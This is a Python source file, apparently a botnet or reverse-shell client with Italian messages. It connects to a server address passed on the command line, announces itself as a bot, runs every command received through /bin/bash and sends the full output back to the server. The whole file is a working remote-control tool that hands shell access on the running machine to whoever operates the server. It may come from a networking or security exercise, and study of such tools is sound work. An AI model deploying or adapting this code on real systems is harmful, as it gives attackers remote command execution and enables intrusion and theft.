import sys
from subprocess import Popen, PIPE
from socket import *

def main():
    if len(sys.argv) != 2:
        print("Uso: python3 client.py <server_ip>")
        sys.exit(1)

    serverName = sys.argv[1]
    serverPort = 8000

    clientSocket = socket(AF_INET, SOCK_STREAM)

    try:
        clientSocket.connect((serverName, serverPort))
        print(f"Connesso a {serverName}:{serverPort}")
        clientSocket.sendall("Bot reporting for duty".encode())

        command = clientSocket.recv(4064).decode('utf-8', 'ignore')

        while command.strip().lower() != "exit":
            try:
                print(f"Eseguo: {command}")

                # Esegue il comando in una shell vera e propria
                proc = Popen(command, shell=True, stdout=PIPE, stderr=PIPE, executable="/bin/bash")
                result, err = proc.communicate()

                output = ""
                if result:
                    output += result.decode(errors="ignore")
                if err:
                    output += err.decode(errors="ignore")

                # Invia l'intero output al server
                if output.strip() == "":
                    output = "[Comando eseguito ma nessun output]\n"
                clientSocket.sendall(output.encode())

            except Exception as e:
                error_message = f"Errore nell'esecuzione: {str(e)}"
                clientSocket.sendall(error_message.encode())

            command = clientSocket.recv(4064).decode('utf-8', 'ignore')

    except Exception as e:
        print(f"Errore: {str(e)}")
    finally:
        print("Chiusura connessione...")
        clientSocket.close()

if __name__ == "__main__":
    main()

